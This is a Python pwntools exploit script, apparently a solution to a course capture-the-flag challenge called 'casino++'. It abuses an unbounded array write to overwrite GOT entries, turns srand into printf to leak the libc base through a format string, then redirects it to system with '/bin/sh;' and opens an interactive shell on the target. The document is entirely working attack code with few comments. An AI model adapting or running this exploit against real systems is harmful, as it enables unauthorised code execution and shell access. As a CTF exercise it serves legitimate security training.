from pwn import *

context.arch = 'amd64'

# sh = process('./casino++-576e3f5261841f3d9d26eb68961f2cf8')
# sh = remote('edu-ctf.csie.org', 10176)
sh = remote('localhost', 5566)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

name        = 0x6020f0
puts_got    = 0x602020
guess_got   = 0x6020d0
srand_got   = 0x602040
printf_plt  = 0x400700

leave_ret = 0x400924
casino = 0x40095d

random  = [0x31, 0x2c, 0x26, 0x58, 0x31, 0x18]
random2 = [0x53, 0x62, 0x41, 0x06, 0x3b, 0x0e]

def changenumber(i, n):
    # Unbounded array allows us to overwrite bss
    sh.sendlineafter(': ', str(1))
    sleep(0.1)
    sh.sendlineafter(': ', str(i))
    sleep(0.1)
    sh.sendlineafter(': ', str(n))
    sleep(0.1)

def sendtrash():
    for i in range(6):
        sh.sendlineafter(': ', str(7))
        sleep(0.1)

def sendanswer():
    for i in range(6):
        sh.sendlineafter(': ', str(random[i]))
        sleep(0.1)

def sendanswer2():
    for i in range(6):
        sh.sendlineafter(': ', str(random2[i]))
        sleep(0.1)

# Overwriting seed
seed = name + 0x18
payload = 'a'*0x10 + p32(seed) + 'AGEE' + '/bin/sh;' + '%25$lxMARK'
sh.sendlineafter('name: ', payload)
sleep(0.1)
sh.sendlineafter('age: ', str(30))
sleep(0.1)

#   looping casino, 
#   allow us to input for many times
idx = (puts_got - guess_got) / 4 + 1
# Some useless input
sendtrash()
changenumber(idx, casino)
sendanswer()
changenumber(idx+1, 0)

#   overwrite srand to printf, 
#   getting formatting string vulns to leak libc
idx = (srand_got - guess_got) / 4 + 1
sendtrash()
changenumber(idx, printf_plt)
sendanswer()
changenumber(idx+1, 0)

sh.recvuntil('/bin/sh;')
libc.address = int('0x' + sh.recvuntil('MARK', drop=True), 16) - 0x21b97
print('[+] libc.address = %s' % hex(libc.address))

#   overwrite srand to system
system = hex(libc.symbols['system'])
system_l = int('0x' + system[-8:], 16)
system_h = int(system[:-8], 16)
print('[+] system = %s'   % system)
print('[+] system_l = %s %d' % (hex(system_l), system_l))
print('[+] system_h = %s %d' % (hex(system_h), system_h))

sendtrash()
changenumber(idx, system_l)
sendanswer2()
changenumber(idx+1, system_h)

sh.interactive()

